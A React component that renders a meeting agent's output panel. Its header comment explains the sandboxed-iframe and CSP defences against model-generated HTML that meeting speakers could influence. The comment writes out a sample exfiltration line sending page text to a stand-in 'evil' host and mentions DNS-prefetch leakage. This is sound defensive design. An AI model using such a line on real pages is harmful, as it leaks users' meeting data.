// One agent's live output panel.
//
// Three render modes, chosen by the agent's `widget_type`:
//   markdown — the note-taker's growing document, via MarkdownRenderer
//   html     — the sketch artist's self-contained widget, in a sandboxed iframe
//   chat     — a message thread the user drives directly
//
// The HTML mode is the one with a security posture worth stating, and it takes
// THREE controls, not one. The document is model-generated from meeting
// transcript — which anyone who speaks in the meeting can influence — so:
//
//   1. It renders inside a `srcDoc` iframe with `sandbox="allow-scripts"` and NO
//      `allow-same-origin`. That pair gives the frame a null origin, so its
//      scripts cannot reach this document, our cookies, or the gateway. It is
//      never injected into this page's DOM by any route.
//   2. That is necessary but NOT sufficient: a null origin blocks READING this
//      page, and does nothing about OUTBOUND requests — `fetch(…)` and
//      `new Image().src = 'https://evil/?d='+document.body.innerText` both work
//      fine from one. So the srcdoc is built by `buildSketchSrcdoc`, which
//      prepends a CSP that denies all egress (`connect-src 'none'`, `img-src`
//      with no `https:`) and pins scripts to the same-origin vendored Mermaid
//      file. The frame needs no network, so it is granted none.
//   3. Nor was the CSP sufficient on its own, because it must grant `script-src
//      'unsafe-inline'` for the Mermaid bootstrap. That let the MODEL's inline
//      script run too, and script can stream the transcript out through
//      `<link rel="dns-prefetch">` lookups that no CSP directive governs. So
//      `buildSketchSrcdoc` also strips the model's scripts, event handlers, and
//      speculative/navigational elements before serializing.
//
// The diagram still renders: Mermaid is driven by OUR bootstrap from the
// declarative `div.mermaid` markup the agent is instructed to emit, so removing
// the model's own JS costs the feature nothing. See ../lib/sketchSrcdoc.ts for
// each directive's rationale and the full vector list.
//
// The markdown mode is also EDITABLE — the minutes the user can correct. The panel
// only ever shows one copy: an edit takes precedence server-side, so `output` is
// already whatever should be on screen and there is no merge to do here. What this
// component owns is the draft (local, seeded when edit mode opens, so the 5-second
// outputs poll cannot type over the user) and the two states a reader has to be able
// to tell apart: that they are looking at their own text rather than the agent's, and
// that the agent has written more since. HTML and chat agents are not editable; see
// `EDITABLE_WIDGET_TYPE` in the backend constants for why.

import { useRef, useState } from 'react'
import {
  FileText,
  MessageSquare,
  Pencil,
  RotateCcw,
  Volume2,
  VolumeX,
} from 'lucide-react'

import { i18nT } from '../../../i18n/t'
import { useConfirm } from '../../../components/ConfirmDialog'
import MarkdownRenderer from '../../../components/MarkdownRenderer'
import { Btn, Card, CardTitle, Input, SendBtn } from '../../../components/ui'
import type { AgentDef, OutputEdit } from '../api'
import { buildSketchSrcdoc } from '../lib/sketchSrcdoc'
import { useImeGuard } from '../../../hooks/useImeGuard'

interface Props {
  agent: AgentDef
  /** The EFFECTIVE output: the user's edit when one exists, otherwise the agent's. */
  output: string
  listening: boolean
  chatView: boolean
  /**
   * Set when the user has edited this agent's output. Its `content` is not carried —
   * `output` above is already the edited text.
   */
  edit?: OutputEdit
  /** True while a save or revert is in flight (for any panel). */
  editSaving?: boolean
  onToggleListening: () => void
  onToggleChatView: () => void
  onSendMessage: (text: string) => void
  /** Absent for an agent whose output is not editable (html widgets, chat agents). */
  onSaveOutput?: (content: string) => Promise<unknown>
  onRevertOutput?: () => void
}

export default function AgentPanel({
  agent,
  output,
  listening,
  chatView,
  edit,
  editSaving = false,
  onToggleListening,
  onToggleChatView,
  onSendMessage,
  onSaveOutput,
  onRevertOutput,
}: Props) {
  const ime = useImeGuard()
  const { confirm, confirmDialog } = useConfirm()
  const inputRef = useRef<HTMLInputElement>(null)
  const [sent, setSent] = useState<string[]>([])
  // `null` means "not editing". One piece of state rather than a boolean plus a
  // string, so the two can never disagree about whether there is a draft.
  //
  // Seeded when edit mode OPENS and never from a poll, which is what makes the
  // outputs query safe to keep refetching underneath: a 5-second poll landing
  // mid-sentence cannot overwrite what the user is typing.
  const [draft, setDraft] = useState<string | null>(null)
  const isChatAgent = agent.widget_type === 'chat'
  const showChat = chatView || isChatAgent
  const editable = onSaveOutput != null && !showChat
  const editing = draft !== null

  const saveDraft = async () => {
    if (draft === null || onSaveOutput == null) return
    const submittedDraft = draft
    try {
      await onSaveOutput(submittedDraft)
    } catch {
      // The session hook reports the transport error. Keep the draft open: closing
      // here would turn a failed save into permanent loss of the user's correction.
      return
    }
    // Saving is asynchronous but the textarea remains editable. Only close the
    // exact snapshot the request persisted; text typed while it was in flight is
    // still a local draft and must stay on screen.
    setDraft(current => current === submittedDraft ? null : current)
  }

  const requestRevert = async () => {
    if (onRevertOutput == null) return
    const confirmed = await confirm({
      title: i18nT('apps.meetings.agentPanel.revert'),
      body: i18nT('apps.meetings.agentPanel.revertHint', { name: agent.name }),
      confirmLabel: i18nT('apps.meetings.agentPanel.revert'),
    })
    if (confirmed) onRevertOutput()
  }

  const send = () => {
    const text = inputRef.current?.value.trim()
    if (!text) return
    onSendMessage(text)
    setSent(prev => [...prev, text])
    if (inputRef.current) inputRef.current.value = ''
  }

  const header = (
    <div className="flex items-center justify-between gap-2">
      <div className="flex items-center gap-2 min-w-0">
        <CardTitle>{agent.name}</CardTitle>
        {/* Which copy is on screen is the first thing to know about an edited panel,
            so it is stated next to the name rather than hidden in a tooltip. */}
        {edit && !editing && (
          <span className="flex-none px-1.5 py-0.5 rounded text-[11px] bg-accent/15 border border-accent/20 text-text">
            {i18nT('apps.meetings.agentPanel.edited')}
          </span>
        )}
      </div>
      <div className="flex items-center gap-1">
        {/* Hidden while editing: switching to the chat view would unmount the
            textarea and take the draft with it, silently. */}
        {!isChatAgent && !editing && (
          <Btn
            onClick={onToggleChatView}
            aria-label={
              chatView
                ? i18nT('apps.meetings.agentPanel.showOutput')
                : i18nT('apps.meetings.agentPanel.showChat')
            }
            title={
              chatView
                ? i18nT('apps.meetings.agentPanel.showOutput')
                : i18nT('apps.meetings.agentPanel.showChat')
            }
          >
            {chatView ? (
              <FileText className="lucide-inline" />
            ) : (
              <MessageSquare className="lucide-inline" />
            )}
          </Btn>
        )}
        <Btn
          onClick={onToggleListening}
          aria-label={
            listening
              ? i18nT('apps.meetings.agentPanel.mute', { name: agent.name })
              : i18nT('apps.meetings.agentPanel.unmute', { name: agent.name })
          }
          title={
            listening
              ? i18nT('apps.meetings.agentPanel.listeningHint')
              : i18nT('apps.meetings.agentPanel.mutedHint')
          }
        >
          {listening ? (
            <Volume2 className="lucide-inline" />
          ) : (
            <VolumeX className="lucide-inline" />
          )}
        </Btn>
      </div>
    </div>
  )

  if (showChat) {
    return (
      <Card className="col-span-2 flex flex-col gap-2">
        {header}
        <div className="flex-1 min-h-[120px] max-h-[320px] overflow-y-auto flex flex-col gap-2">
          {sent.length === 0 ? (
            <p className="text-[13px] text-muted">
              {i18nT('apps.meetings.agentPanel.chatEmpty', { name: agent.name })}
            </p>
          ) : (
            sent.map((message, index) => (
              <div
                key={`${index}-${message.slice(0, 12)}`}
                className="self-end max-w-[85%] px-3 py-1.5 rounded-2xl rounded-br-sm bg-accent/15 border border-accent/20 text-[13px] text-text break-words"
              >
                {message}
              </div>
            ))
          )}
        </div>
        <div className="flex items-center gap-2 pt-2 border-t border-border">
          <Input
            ref={inputRef}
            type="text"
            className="flex-1"
            placeholder={i18nT('apps.meetings.agentPanel.messagePlaceholder', {
              name: agent.name,
            })}
            aria-label={i18nT('apps.meetings.agentPanel.messagePlaceholder', {
              name: agent.name,
            })}
            {...ime.bindEnter({ onEnter: send })}
          />
          <SendBtn onClick={send} aria-label={i18nT('apps.meetings.agentPanel.send')}>
            {i18nT('apps.meetings.agentPanel.send')}
          </SendBtn>
        </div>
      </Card>
    )
  }

  if (agent.widget_type === 'html') {
    return (
      <Card className="col-span-2 flex flex-col gap-2">
        {header}
        {output ? (
          <iframe
            title={i18nT('apps.meetings.agentPanel.diagramFrameTitle', { name: agent.name })}
            // buildSketchSrcdoc strips the model's scripts/handlers, then wraps
            // what is left in a CSP that denies all network egress and pins
            // scripts to our vendored same-origin Mermaid.
            // `window.location.origin` is required (not a bare path): the frame is
            // null-origin, so a relative /vendor/... URL would not resolve and the
            // CSP cannot use 'self'. Guarded for a non-browser test/SSR context —
            // '' pins a path-only source that matches nothing, i.e. fails CLOSED.
            srcDoc={buildSketchSrcdoc(
              output,
              typeof window === 'undefined' ? '' : window.location.origin,
            )}
            // Null-origin sandbox: scripts may run inside the frame (OUR Mermaid
            // bootstrap needs to) but WITHOUT same-origin, so nothing in the frame
            // can reach this page, its cookies, or the gateway. This is the HARD
            // boundary; the CSP above is the egress control the sandbox lacks.
            sandbox="allow-scripts"
            className="w-full border border-border rounded-md bg-white"
            // The transform is the same compositing promotion every sandbox-doc
            // frame carries: a laid-out document whose first paint is skipped
            // shows an empty box (silent — correct height, no error state), and
            // promoting the frame to its own layer is the remedy that needs no
            // post-load timing. This frame builds its document inline (srcDoc,
            // outside the sandbox-doc mint), so it was left out when the mint's
            // consumers were promoted.
            style={{ minHeight: 340, height: 340, transform: 'translateZ(0)' }}
          />
        ) : (
          <p className="text-[13px] text-muted">
            {i18nT('apps.meetings.agentPanel.awaitingOutput', { name: agent.name })}
          </p>
        )}
      </Card>
    )
  }

  if (editing) {
    return (
      <Card className="col-span-2 flex flex-col gap-2">
        {header}
        <textarea
          value={draft}
          onChange={e => setDraft(e.target.value)}
          // Distinct from the card's title on purpose: the region and the control are
          // different things, and giving both the same accessible name makes them
          // indistinguishable to a screen reader.
          aria-label={i18nT('apps.meetings.agentPanel.editorLabel', { name: agent.name })}
          spellCheck
          className="min-h-[280px] max-h-[520px] resize-y bg-transparent border border-border rounded-md outline-none p-3 text-[13px] leading-relaxed text-text font-body focus-ring"
        />
        <div className="flex items-center justify-end gap-2">
          <Btn onClick={() => setDraft(null)} disabled={editSaving}>
            {i18nT('apps.meetings.agentPanel.cancel')}
          </Btn>
          <SendBtn
            onClick={saveDraft}
            disabled={editSaving}
          >
            {i18nT('apps.meetings.agentPanel.save')}
          </SendBtn>
        </div>
      </Card>
    )
  }

  return (
    <Card className="col-span-2 flex flex-col gap-2">
      {header}
      {(editable || (edit && onRevertOutput)) && (
        <div className="flex flex-wrap items-center justify-end gap-2 pt-2 border-t border-border">
          {editable && (
            <Btn
              onClick={() => setDraft(output)}
              aria-label={i18nT('apps.meetings.agentPanel.edit')}
            >
              <Pencil className="lucide-inline" />
              {i18nT('apps.meetings.agentPanel.edit')}
            </Btn>
          )}
          {edit && onRevertOutput && (
            <Btn
              danger
              onClick={() => void requestRevert()}
              disabled={editSaving}
              aria-label={i18nT('apps.meetings.agentPanel.revert')}
              title={i18nT('apps.meetings.agentPanel.revertHint', { name: agent.name })}
            >
              <RotateCcw className="lucide-inline" />
              {i18nT('apps.meetings.agentPanel.revert')}
            </Btn>
          )}
        </div>
      )}
      {/* The honest half of the sidecar bargain. The edit keeps winning — that is the
          feature — so a panel whose agent has moved on must SAY so, or it looks like
          the agent simply stopped writing. */}
      {edit?.stale && (
        <p className="flex-none text-[12px] text-muted">
          {i18nT('apps.meetings.agentPanel.staleEdit', { name: agent.name })}
        </p>
      )}
      {/* The scroller must live INSIDE the Card, never on it: Card prepends
          `card-glow`, whose `overflow:hidden` (declared after @tailwind utilities
          in index.css) beats an `overflow-y-auto` utility on the same element —
          equal specificity, later source order wins, and twMerge cannot resolve a
          conflict with a hand-written class. Scrolling on an inner div mirrors how
          the in-panel chat scrolls (#7664). */}
      <div
        data-testid="agent-output-pane"
        // 60svh keeps the pane shorter than the column that scrolls it on a
        // phone (the workspace gives this column ~380px there), so touch
        // scrolling never traps inside a pane taller than its container.
        // `vh` stays as the fallback, same idiom as AgentsPage.
        className="max-h-[min(520px,60vh)] supports-[height:100svh]:max-h-[min(520px,60svh)] overflow-y-auto"
      >
        {output ? (
          <MarkdownRenderer content={output} />
        ) : (
          <p className="text-[13px] text-muted">
            {i18nT('apps.meetings.agentPanel.awaitingOutput', { name: agent.name })}
          </p>
        )}
      </div>
      {confirmDialog}
    </Card>
  )
}
